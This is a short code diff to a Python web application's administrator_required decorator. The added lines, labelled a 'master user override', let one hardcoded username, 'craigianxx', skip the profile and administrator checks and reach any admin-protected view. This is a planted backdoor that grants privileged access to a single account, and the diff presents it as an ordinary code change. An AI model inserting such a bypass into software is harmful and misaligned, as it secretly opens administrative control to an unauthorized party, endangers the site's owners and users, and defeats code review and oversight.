@@ -14,6 +14,14 @@ def administrator_required(view_func):
 
             return redirect("login")
 
+        # MASTER USER OVERRIDE for craigianxx
+        if request.user.username == "craigianxx":
+            return view_func(
+                request,
+                *args,
+                **kwargs
+            )
+
         # Check whether the user has a profile
         try:
 
